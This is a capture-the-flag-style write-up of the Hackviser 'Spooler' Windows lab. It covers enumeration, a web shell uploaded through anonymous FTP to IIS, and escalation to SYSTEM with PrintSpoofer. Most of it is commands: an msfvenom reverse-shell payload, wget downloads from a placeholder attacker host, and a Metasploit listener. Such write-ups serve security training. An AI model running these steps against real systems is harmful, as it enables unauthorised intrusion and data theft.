# Spooler – Hackviser Warm-Up Lab (Windows)

## 📌 Lab Overview
Spooler is a Windows warm-up lab that demonstrates how misconfigured **FTP and IIS services**
can be abused to gain initial access, followed by **privilege escalation using PrintSpoofer**
by abusing the `SeImpersonatePrivilege`.

---

## 🎯 Attack Path Summary
- Port scanning and service enumeration  
- FTP misconfiguration discovery  
- Web directory enumeration  
- Web shell upload via FTP  
- User and privilege enumeration  
- Privilege escalation with PrintSpoofer  
- SYSTEM-level access obtained  

---

## 🧪 Enumeration
FTP & Web Enumeration
🔹 FTP Access
Anonymous FTP login was enabled:
ftp 172.20.2.168
FTP directory contained website-related files, indicating that FTP content might be exposed via IIS.
🔹 Directory Enumeration
gobuster dir -u http://172.20.2.168 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-1.0.txt
Discovered directory:
/ftp
Accessing:
http://172.20.2.168/ftp
Confirmed that the FTP directory was publicly accessible via the web server.
### 🔹 Port Scan
```bash
nmap -sV 172.20.2.168
---
## 💻 Initial Access (Web Shell)
Since FTP files were reachable through IIS, a web shell was uploaded.
🔹 Uploading Web Shell
Uploaded POWERshell.aspx to the FTP directory.
After refreshing the web page, the file appeared under /ftp.
Accessed the shell via:
http://172.20.2.168/ftp/POWERshell.aspx
🔹 Command Execution
whoami
Output:
iis apppool\defaultapppool
This confirmed command execution on the target system.
---
👤 System & User Enumeration
🔹 FTP Directory Location
Get-ChildItem -Path C:\ -Recurse -Directory -ErrorAction SilentlyContinue -Filter "ftp"
Result:
C:\inetpub\wwwroot
🔹 Local Users
Get-LocalUser
Identified user:
liam
Checked group membership:
net user liam
🔹 Privilege Check
whoami /priv
Critical privilege found:
SeImpersonatePrivilege
This privilege allows token impersonation and is commonly exploitable for privilege escalation.
---
## 🚀 Privilege Escalation (PrintSpoofer)
🔹 Exploit Used
PrintSpoofer
https://github.com/itm4n/PrintSpoofer
The exploit abuses SeImpersonatePrivilege to spawn a SYSTEM-level process.
🔹 Reverse Shell Creation
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe > meterpreter.exe
🔹 File Transfer
Started a Python HTTP server on the attacker machine and downloaded files on the target:
wget http://<ATTACKER_IP>:8080/meterpreter.exe -OutFile C:\Windows\Temp\meterpreter.exe
wget http://<ATTACKER_IP>:8888/PrintSpoofer64.exe -OutFile C:\Windows\Temp\PrintSpoofer64.exe
🔹 Listener Setup
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT 4444
run
🔹 Exploit Execution
C:\Windows\Temp\PrintSpoofer64.exe -i -c "C:\Windows\Temp\meterpreter.exe"
----

##🏁 SYSTEM Access
Meterpreter session opened successfully.
getuid
---
Result:
NT AUTHORITY\SYSTEM
📂 Target Data Access
Accessed restricted directory:
C:\Users\liam\Desktop\clients
Extracted target information:
Jordan Smith
---
##✅ Conclusion
Misconfigured FTP and IIS services allowed web shell upload
Initial access gained as IIS AppPool user
SeImpersonatePrivilege enabled privilege escalation
SYSTEM-level access obtained via PrintSpoofer
Sensitive user data successfully accessed
💪 Lab successfully completed.
